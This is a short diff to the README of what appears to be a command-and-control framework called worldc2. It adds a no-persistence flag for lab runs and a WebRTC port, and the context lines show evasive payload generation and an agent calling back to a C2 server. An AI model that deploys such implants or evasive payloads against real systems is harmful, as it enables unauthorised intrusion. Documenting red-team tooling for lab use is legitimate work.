@@ -17,6 +17,7 @@ python3 scripts/payload.py --os windows --evasive  # + stagers
 ```bash
 ./worldc2-agent <server-ip>:8443           # Go agent
 WORLDC2_SERVER=<ip>:8443 ./worldc2-agent       # Via env var
+./worldc2-agent <server-ip>:8443 -no-persist   # Lab runs: no auto-persistence
 ```
 
 ## CLI Console
@@ -94,8 +95,9 @@ make help           # Show all targets
 | Port | Protocol | Use |
 |------|----------|-----|
 | 8443 | TCP/TLS | Agent C2 |
-| 8445 | HTTP | Long-polling |
+| 8445 | HTTP | Long-polling (experimental — not agent-reachable yet) |
 | 8446 | WebSocket | Real-time |
+| 8447 | HTTP(S) | WebRTC signaling + data channels |
 | 9090 | HTTP | API + Dashboard |
 
 ## Modules
